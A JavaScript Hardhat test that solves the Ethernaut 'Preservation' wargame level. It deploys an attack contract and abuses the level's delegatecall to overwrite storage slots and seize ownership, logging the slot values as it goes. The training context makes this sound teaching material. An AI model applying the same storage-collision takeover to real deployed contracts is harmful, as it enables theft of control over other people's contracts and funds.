// npx hardhat test ./test/16_preservation.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "Preservation";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._16_preservation, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    let storageSlot;
    storageSlot = await ethers.provider.getStorageAt(levelContract.address, 0);
    console.log(`Storage slot 0 has value: "${storageSlot}"`);
    storageSlot = await ethers.provider.getStorageAt(levelContract.address, 2);
    console.log(`Storage slot 2 has value: "${storageSlot}"`);

    let attackFactory = await ethers.getContractFactory("PreservationAttack");
    let attack = await attackFactory.deploy();
    await attack.deployTransaction.wait();

    let tx = await levelContract.setFirstTime(attack.address);
    await tx.wait();
    storageSlot = await ethers.provider.getStorageAt(levelContract.address, 0);
    console.log(`Storage slot 0 has value: "${storageSlot}"`);

    const accounts = await ethers.getSigners();
    tx = await levelContract.setFirstTime(accounts[0].address);
    await tx.wait();

    storageSlot = await ethers.provider.getStorageAt(levelContract.address, 2);
    console.log(`Storage slot 2 has value: "${storageSlot}"`);

    //console.log(tx);
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});